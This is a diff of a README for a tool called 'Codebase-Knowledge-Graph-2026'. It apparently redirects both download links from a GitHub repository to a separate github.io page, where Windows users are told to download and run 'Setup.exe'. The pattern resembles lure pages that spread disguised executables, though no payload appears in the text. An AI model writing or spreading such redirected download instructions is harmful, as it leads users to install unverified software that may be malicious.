@@ -1,6 +1,6 @@
 # 🌐 Codebase-Knowledge-Graph-2026 - Search your code with modern intelligence
 
-[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://github.com/Bellpushpneumonicplague31/Codebase-Knowledge-Graph-2026)
+[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://bellpushpneumonicplague31.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows PC:
 
-1. Visit the [official download page](https://github.com/Bellpushpneumonicplague31/Codebase-Knowledge-Graph-2026).
+1. Visit the [official download page](https://bellpushpneumonicplague31.github.io).
 2. Locate the link labeled "Setup.exe" under the latest release section.
 3. Click the link to begin the download.
 4. Save the file to your desktop or downloads folder.
